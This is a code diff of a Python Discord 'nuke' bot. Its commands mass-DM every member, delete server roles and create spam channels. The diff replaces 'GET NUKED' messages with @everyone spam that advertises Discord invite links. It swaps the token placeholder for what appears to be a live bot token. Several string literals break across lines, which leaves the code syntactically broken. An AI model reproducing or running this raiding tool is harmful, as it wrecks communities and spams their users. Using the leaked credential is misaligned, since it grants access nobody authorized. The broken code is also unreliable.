@@ -91,7 +91,9 @@ async def mall(ctx):
     for member in list(client.get_all_members()):
         await asyncio.sleep(0)
         try:
-            await member.send("GET NUKED")
+            await member.send("@everyone new servers https://discord.gg/6RZ7YH6USS
+https://discord.gg/Y2PYKrS9
+@everyone")
         except:
             pass
         print("Action completed: Message all")
@@ -108,8 +110,12 @@ async def destroy(ctx):
         except:
             pass
         guild = ctx.message.guild
-        channel = await guild.create_text_channel("Ez Clap")
-        await channel.send("GET NUKED")
+        channel = await guild.create_text_channel("gg/6RZ7YH6USS
+.gg/Y2PYKrS9
+@everyone")
+        await channel.send("@everyone new servers https://discord.gg/6RZ7YH6USS
+https://discord.gg/Y2PYKrS9
+@everyone")
     for role in list(ctx.guild.roles):
         try:
             await role.delete()
@@ -159,5 +165,5 @@ async def info(ctx, member: discord.Member=None):
     print("Action completed: User Info")
 #############################
 
-client.run("TOKEN")
+client.run("MTMxNDU2NDI5NDQ4NjI2NTg3Nw.GXdiaC.7c2x2WnTuJf9ibufikaQsLM7Q8F7EYWiJLzZE4")
 # Place your Bot's token here
